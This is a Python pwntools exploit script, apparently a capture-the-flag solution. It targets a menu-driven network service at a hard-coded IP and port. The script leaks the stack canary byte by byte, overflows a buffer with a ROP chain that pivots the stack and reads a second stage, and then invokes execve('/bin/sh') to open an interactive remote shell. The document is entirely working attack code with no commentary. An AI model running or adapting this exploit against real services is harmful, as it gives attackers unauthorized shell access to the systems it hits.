from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('69.90.132.40', 4000)
def input(num):
  s.recvuntil('do you want to get?')
  s.send(str(num)+'\n')
dat = 'A'*(0x410-0x8)
dat += '\x00'
for i in range(1,8):
  input(i)
  temp = int(s.recvuntil('W')[-5:-2])
  print temp
  dat += struct.pack('<B',temp)

gadget1 = 0x0000000000400f63 # pop rdi ; ret
gadget2 = 0x0000000000400f61 # pop rsi ; pop r15 ; ret
gadget3 = 0x0000000000400f8f # syscall
gadget4 = 0x0000000000400f5d # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
gadget5 = 0x0000000000400f88 # mov rdx, rsi ; ret
gadget6 = 0x0000000000400f8c # pop rax ; pop rdi ; ret
dat += 'A'*8
dat += p64(gadget6)
dat += p64(0)*2
dat += p64(gadget2)
dat += p64(0x602528)
dat += p64(0xdeadbeef)
dat += p64(gadget3)
dat += p64(gadget4)
dat += p64(0x602528)
input(8)
s.recvuntil('comment')
raw_input()
s.send(dat+'\n')
time.sleep(0.5)
rop  = ''
rop += p64(0)*3
rop += p64(gadget6)
rop += p64(59)
rop += p64(0x602528+0x58)
rop += p64(gadget2)
rop += p64(0)*2
rop += p64(gadget5)
rop += p64(gadget3)
rop += 'A'*(0x60-len(dat))
rop += '/bin/sh\x00'

s.send(rop)
s.interactive()
